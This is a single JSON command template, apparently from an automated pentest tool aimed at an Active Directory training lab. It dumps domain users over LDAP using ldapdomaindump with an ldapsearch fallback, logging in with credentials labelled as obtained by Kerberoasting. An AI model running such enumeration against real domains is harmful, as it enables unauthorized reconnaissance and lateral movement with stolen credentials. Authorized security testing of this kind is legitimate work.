    "command_template": "mkdir -p /tmp/ldap_dump && ldapdomaindump -u '{domain}\\{kerberoast_user}' -p '{kerberoast_pass}' ldap://{dc_ip} -o /tmp/ldap_dump --no-json --no-grep 2>&1 && echo '--- users ---' && wc -l /tmp/ldap_dump/domain_users.grep 2>/dev/null || echo 'ldapdomaindump not found; trying ldapsearch' && ldapsearch -x -H ldap://{dc_ip} -D '{kerberoast_user}@{domain}' -w '{kerberoast_pass}' -b 'DC=north,DC=sevenkingdoms,DC=local' '(objectClass=user)' sAMAccountName 2>&1 | grep sAMAccountName | head -20",
